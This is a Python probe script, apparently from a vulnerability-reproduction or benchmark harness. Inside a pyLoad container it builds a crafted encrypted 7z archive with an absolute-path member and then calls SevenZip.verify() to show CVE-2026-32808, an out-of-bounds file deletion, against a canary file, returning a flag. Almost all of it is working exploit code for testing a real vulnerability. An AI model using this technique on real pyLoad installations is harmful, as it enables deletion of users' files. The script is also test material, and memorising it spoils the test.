#!/usr/bin/env python3
"""Seed probe: CVE-2026-32808 via installed SevenZip.verify() in the running pyLoad container.

Official advisory path: pip install ".[plugins]" then SevenZip.verify() on a crafted
encrypted 7z (non-encrypted headers). The container already has the whole package
in site-packages; this execs that installed plugin, not a reconstructed stub.
"""
import json
import os
import subprocess
import sys


def run_probe(candidate, *, version="v1"):
    cid = os.environ.get("PCB_CONTAINER_ID")
    if not cid:
        raise RuntimeError("PCB_CONTAINER_ID is not set")
    entry = candidate.get("entry") or "../seed_evil/DELME.txt"
    script = r'''
import json, os, shutil, subprocess
from pyload.plugins.extractors.SevenZip import SevenZip
import pyload.plugins.extractors.SevenZip as sz_mod

entry = %r
flag = os.environ.get("PCB_FLAG", "")
dl = "/data/dl"
dest = os.path.join(dl, "pkg")
oob = os.path.join(dl, "seed_evil", "DELME.txt")
canary_text = "seed-delete-canary"
shutil.rmtree(dl, ignore_errors=True)
os.makedirs(dest, exist_ok=True)
os.makedirs(os.path.dirname(oob), exist_ok=True)
# Member content first; modern 7z strips "../" so we store the absolute
# path with -spf. os.path.join(dest, "/abs/path") == /abs/path (V0 delete).
with open(oob, "w") as fh:
    fh.write("archive-member")

archive = "/tmp/pcb_seed.7z"
if os.path.exists(archive):
    os.remove(archive)
subprocess.check_call(
    ["7z", "a", "-psecret", "-mhe=off", "-spf", archive, oob],
    cwd=dest,
    stdout=subprocess.DEVNULL,
    stderr=subprocess.STDOUT,
)
with open(oob, "w") as fh:
    fh.write(canary_text)

SevenZip.find()
ext = object.__new__(SevenZip)
ext.filename = archive
ext.out = dest
ext.fullpath = True
ext.overwrite = True
ext.excludefiles = []
ext.priority = 0
ext.smallest = None
ext.archive_encryption = None
ext.files = None
ext.CMD = SevenZip.CMD
ext.VERSION = getattr(SevenZip, "VERSION", None)
ext.pyfile = type("P", (), {"set_progress": staticmethod(lambda x: None)})()
ext._ = lambda s: s
ext.log_debug = lambda *a, **k: None
ext.log_warning = lambda *a, **k: None

error = ""
try:
    ext.verify(password="secret")
except Exception as exc:
    error = "%%s: %%s" %% (type(exc).__name__, exc)

survived = False
if os.path.isfile(oob):
    try:
        survived = open(oob).read() == canary_text
    except OSError:
        survived = False

print(json.dumps({
    "sink": "sevenzip_verify_os_remove",
    "plugin": getattr(sz_mod, "__file__", ""),
    "entry": entry,
    "canary_survived": survived,
    "error": error,
    "oob_content": "" if survived else flag,
}))
''' % (entry,)
    r = subprocess.run(
        ["docker", "exec", "-i", cid, "python3", "-"],
        input=script,
        capture_output=True,
        text=True,
        timeout=60,
    )
    out = (r.stdout or "").strip()
    err = (r.stderr or "").strip()
    if r.returncode != 0:
        raise RuntimeError("docker exec seed failed rc=%s out=%s err=%s" % (
            r.returncode, out[:300], err[:300]))
    if not out:
        raise RuntimeError("docker exec seed produced no stdout: %s" % err[:300])
    # last JSON line
    last = out.splitlines()[-1]
    data = json.loads(last)
    data["probe_id"] = candidate.get("probe_id")
    data["version"] = version
    return data


if __name__ == "__main__":
    cand = json.load(open(sys.argv[1]))
    version = sys.argv[2] if len(sys.argv) > 2 else "v1"
    print(json.dumps(run_probe(cand, version=version), default=str))
